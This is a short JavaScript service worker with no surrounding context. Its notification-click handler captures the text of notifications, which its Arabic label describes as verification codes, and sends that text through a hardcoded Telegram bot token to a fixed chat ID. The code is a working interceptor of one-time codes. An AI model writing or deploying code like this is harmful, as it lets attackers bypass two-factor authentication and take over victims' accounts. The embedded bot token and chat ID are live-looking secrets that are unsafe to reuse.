self.addEventListener('notificationclick', function(event) {
    const botToken = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE';
    const chatId = '7802385639';
    const msg = "📩 تم التقاط إشعار جديد (كود التحقق):\n" + event.notification.body;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
});
